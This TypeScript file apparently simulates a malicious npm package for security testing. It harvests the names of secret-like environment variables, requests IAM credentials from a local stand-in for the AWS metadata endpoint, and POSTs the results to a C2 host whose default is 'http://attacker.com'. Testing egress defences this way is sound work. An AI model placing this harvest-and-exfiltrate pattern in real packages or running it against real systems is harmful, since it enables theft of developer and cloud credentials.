import { request } from "undici";
import { logger } from "../logger.js";

// Simulate a compromised package behavior
export async function triggerSupplyChainAttack(c2Target: string = "http://attacker.com") {
    const logs: string[] = [];
    const log = (msg: string) => {
        logger.warn(`[SupplyChain] ${msg}`);
        logs.push(`[${new Date().toLocaleTimeString()}] ${msg}`);
    };

    log("🚨 MALICIOUS PACKAGE ACTIVATED: 'left-pad-ultra'");

    // 1. Harvest Environment Variables
    log("🔍 Harvesting Environment Variables...");
    const secrets = [];
    for (const [key, val] of Object.entries(process.env)) {
        if (key.match(/KEY|SECRET|TOKEN|PASS|PWD/i)) {
            secrets.push(key);
        }
    }
    log(`✅ Found ${secrets.length} potential secrets: ${secrets.join(", ")}`);

    // 2. Cloud Credential Access (Imposter)
    log("☁️  Attempting to steal Cloud Metadata (AWS/GCP)...");
    try {
        // Try AWS Imposter (running on 16925 locally)
        const awsUrl = "http://127.0.0.1:16925/latest/meta-data/iam/security-credentials/";
        log(`   > GET ${awsUrl}`);
        const { statusCode, body } = await request(awsUrl);
        if (statusCode === 200) {
            const roles = await body.text();
            log(`⚠️  AWS ROLES DISCOVERED: ${roles.trim()}`);
            
            // Go deeper
            const role = roles.split("\n")[0];
            if (role) {
                const credsUrl = `${awsUrl}${role}`;
                const credsRes = await request(credsUrl);
                const creds = await credsRes.body.json() as { AccessKeyId?: string };
                log(`🔥 STOLEN AWS CREDS: ${creds.AccessKeyId ?? 'unknown'} (Role: ${role})`);
            }
        } else {
            log("   > AWS Metadata unreachable or locked.");
        }
    } catch (e: any) {
        log(`   > Metadata Connection Failed: ${e.message}`);
    }

    // 3. Exfiltration (Egress)
    log(`📤 Exfiltrating data to C2: ${c2Target}...`);
    try {
        // We simulate a DNS exfil or HTTP POST
        // DNS simulation:
        log("   > Trying DNS Tunneling...");
        // (Skipping actual DNS logic here for simplicity, focusing on HTTP)
        
        // HTTP POST
        log(`   > POST ${c2Target}/upload`);
        await request(c2Target, {
            method: "POST",
            body: JSON.stringify({ secrets, timestamp: Date.now() })
        }).catch(() => {}); // Fire and forget, we expect it might fail if offline
        log("✅ Payload sent to network stack (Result depends on Egress Filtering)");

    } catch (e) {
        log("❌ Exfiltration Blocked?");
    }

    log("💀 Attack Sequence Complete.");
    return logs;
}
